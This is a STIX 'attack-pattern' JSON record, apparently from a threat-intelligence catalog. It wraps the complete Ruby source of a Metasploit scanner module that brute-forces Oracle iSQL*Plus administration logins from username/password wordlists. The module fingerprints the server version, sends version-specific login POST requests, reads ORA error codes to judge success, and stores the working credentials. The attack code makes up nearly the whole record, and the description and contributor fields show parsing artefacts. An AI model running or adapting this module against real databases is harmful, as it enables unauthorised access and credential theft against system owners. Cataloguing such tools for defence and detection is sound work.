{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b9f74df-f82c-43a3-94b3-ca5593ed4bdd",
    "created": "2024-08-14T16:27:56.008867Z",
    "modified": "2024-08-14T16:27:56.008871Z",
    "name": "Oracle iSQL*Plus Login Utility",
    "description": " This module attempts to authenticate against an Oracle ISQL*Plus administration web site using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE.  This module does not require a valid SID, but if one is defined, it will be used. Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to fingerprint the version and automatically select the correct POST request.   'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/isqlplus_login.rb",
            "external_id": "isqlplus_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n\n  def initialize\n    super(\n      'Name'        => 'Oracle iSQL*Plus Login Utility',\n      'Description' => %q{\n        This module attempts to authenticate against an Oracle ISQL*Plus\n        administration web site using username and password combinations indicated\n        by the USER_FILE, PASS_FILE, and USERPASS_FILE.\n\n        This module does not require a valid SID, but if one is defined, it will be used.\n        Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to\n        fingerprint the version and automatically select the correct POST request.\n\n      },\n      'References'  =>\n      [\n        [ 'URL', 'https://blog.carnal0wnage.com/' ],\n      ],\n      'Author'      => [ 'CG', 'todb' ],\n      'License'     => MSF_LICENSE\n      )\n      deregister_options('BLANK_PASSWORDS') # Blank passwords are never valid\n\n      register_options([\n        Opt::RPORT(5560),\n        OptString.new('URI', [ true, 'Oracle iSQLPlus path.', '/isqlplus/']),\n        OptString.new('SID', [ false, 'Oracle SID' ]),\n        OptInt.new('TIMEOUT', [false, 'Time to wait for HTTP responses', 60]),\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"oracle_default_userpass.txt\") ]),\n        OptBool.new('USER_AS_PASS', [ false, \"Try the username as the password for all users\", false]),\n      ])\n\n  end\n\n  def verbose\n    datastore['VERBOSE']\n  end\n\n  def uri\n    datastore['URI'].to_s\n  end\n\n  def timeout\n    (datastore['TIMEOUT'] || 60).to_i\n  end\n\n  def prefix\n    datastore['SSL'] ? \"https\" : \"http\"\n  end\n\n  def msg\n    \"#{prefix}://#{rhost}:#{rport}/#{datastore['URI'].gsub(/^\\/+/,\"\")} -\"\n  end\n\n  def get_oracle_version(ip)\n    begin\n      res = send_request_cgi({\n        'version' => '1.1',\n        'uri'     => uri,\n        'method'  => 'GET',\n      }, timeout)\n      oracle_ver = nil\n      if (res.nil?)\n        print_error(\"#{msg} no response\")\n      elsif (res.code == 200)\n        print_status(\"#{msg} Received an HTTP #{res.code}\")\n        oracle_ver = detect_oracle_version(res)\n      elsif (res.code == 404)\n        print_error(\"#{msg} Received an HTTP 404, check URIPATH\")\n      elsif (res.code == 302)\n        print_error(\"#{msg} Received an HTTP 302 to #{res.headers['Location']}\")\n      else\n        print_error(\"#{msg} Received an HTTP #{res.code}\")\n      end\n      return oracle_ver\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      print_error \"#{msg} Cannot connect\"\n    end\n  end\n\n  def detect_oracle_version(res)\n    m = res.body.match(/iSQL\\*Plus Release (9\\.0|9\\.1|9\\.2|10\\.1|10\\.2)/)\n    oracle_ver = nil\n    oracle_ver = 10 if m[1] && m[1] =~ /10/\n      oracle_ver = m[1].to_f if m[1] && m[1] =~ /9\\.[012]/\n      if oracle_ver\n        print_status(\"#{msg} Detected Oracle version #{oracle_ver}\")\n        print_status(\"#{msg} SID detection for iSQL*Plus 10.1 may be unreliable\") if oracle_ver == 10.1\n      else\n        print_error(\"#{msg} Unknown Oracle version detected.\")\n      end\n    return oracle_ver\n  end\n\n  def check_oracle_version(ver)\n    [9.0,9.1,9.2,10].include? ver\n  end\n\n  def run_host(ip)\n    datastore['BLANK_PASSWORDS'] = false # Always\n    ver = get_oracle_version(ip)\n    if not check_oracle_version(ver)\n      print_error \"#{msg} Unknown Oracle version, skipping.\"\n      return\n    end\n    if datastore['SID'].nil? || datastore['SID'].empty?\n      print_status \"Using blank SID for authentication.\"\n    end\n    each_user_pass do |user, pass|\n      # Blank passwords aren't allowed\n      if pass.nil? || pass.empty?\n        print_status \"Skipping blank password for #{user}\"\n      else\n        do_login(user, pass, ver)\n      end\n    end\n  end\n\n  def sid\n    if datastore['SID'].nil? || datastore['SID'].empty?\n      nil\n    else\n      datastore['SID']\n    end\n  end\n\n  def do_login(user='DBSNMP', pass='DBSNMP', version=9.0)\n    uri = datastore['URI']\n\n    vprint_status(\"#{msg} Trying username:'#{user}' with password:'#{pass}' with SID '#{sid}'\")\n    success = false\n    if version == 9.0\n      postrequest = \"action=logon&sqlcmd=&sqlparms=&username=#{user}&password=#{pass}&sid=#{sid}&privilege=&Log+In=%B5%C7%C2%BC\"\n    elsif (version == 9.1 || version == 9.2)\n      postrequest = \"action=logon&username=#{user}&password=#{pass}&sid=#{sid}&login=Login\"\n    elsif (version == 10)\n      postrequest = \"username=#{user}&password=#{pass}&connectID=#{sid}&report=&script=&dynamic=&type=&action=&variables=&event=login\"\n    end\n\n    begin\n      res = send_request_cgi({\n        'version' => '1.1',\n        'uri'     => uri,\n        'method'  => 'POST',\n        'data'   => postrequest,\n        'headers' => { 'Referer' => \"http://#{rhost}:#{rport}#{uri}\" }\n        }, timeout)\n      unless (res.kind_of? Rex::Proto::Http::Response)\n        vprint_error(\"#{msg} Not responding\")\n        return :abort\n      end\n      return :abort if (res.code == 404)\n\n      if res.code == 200\n        # English, German, and Danish.\n        if (res.body =~ /Connected as/ or res.body =~ /Angemeldet als/ or res.body =~ /Arbejdssk/)\n          success = true\n        elsif (res.body =~ /ORA-01017:/ or res.body =~ /ORA-28273:/)\n          #print_error(\"received ORA-01017 -- incorrect credentials\")\n          success = false\n        elsif (res.body =~ /ORA-28009:/ )\n          print_good(\"#{user}:#{pass} is correct but required SYSDBA or SYSOPER login\")\n          success = true\n        elsif (res.body =~ /ORA-28000:/ )#locked account\n          success = false\n        elsif (res.body =~ /ORA-12170:/ or res.body =~ /ORA-12154:/ or res.body =~ /ORA-12162:/ or res.body =~ /ORA-12560:/)\n          print_status(\"Incorrect SID -- please set a correct (or blank) SID\")\n          return :abort\n        elsif\n          print_error(\"Unknown response, assuming failed. (Supported languages are English, German, and Danish)\")\n          success = false\n        end\n      elsif res.code == 302\n        print_status(\"received a 302 to #{res.headers['Location']}\")\n        return :abort\n      else\n        print_status(\"Unexpected Response of: #{res.code}\")#''\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"#{msg} - #{e}\")\n      return :abort\n    end\n\n    if success\n      print_good(\"#{msg} successful login '#{user}' : '#{pass}' for SID '#{sid}'\")\n      report_isqlplus_service(target_host,res)\n      report_oracle_sid(target_host,sid)\n      report_isqlauth_info(target_host,user,pass,sid)\n      return :next_user\n    else\n      vprint_error \"#{msg} username and password failed\"\n      return :failed\n    end\n  end\n\n  def report_isqlplus_service(ip,res)\n    sname = datastore['SSL'] ? 'https' : 'http'\n    report_service(\n      :host => ip,\n      :proto => 'tcp',\n      :port => rport,\n      :name => sname,\n      :info => res.headers[\"Server\"].to_s.strip\n    )\n  end\n\n  def report_oracle_sid(ip,sid)\n    report_note(\n      :host => ip,\n      :proto => 'tcp',\n      :port => rport,\n      :type => \"oracle.sid\",\n      :data => ((sid.nil? || sid.empty?) ? \"*BLANK*\" : sid),\n      :update => :unique_data\n    )\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_isqlauth_info(ip,user,pass,sid)\n    ora_info = {\n      ip: ip,\n      port: rport,\n      password: pass,\n      proof: sid.inspect,\n      service_name: 'tcp'\n    }\n    if sid.nil? || sid.empty?\n      ora_info.merge! :user => user\n    else\n      ora_info.merge! :user => \"#{sid}/#{user}\"\n    end\n    report_cred(ora_info)\n  end\nend\n",
    "x_mitre_contributors": [
        "[ CG",
        "todb ]",
        ""
    ]
}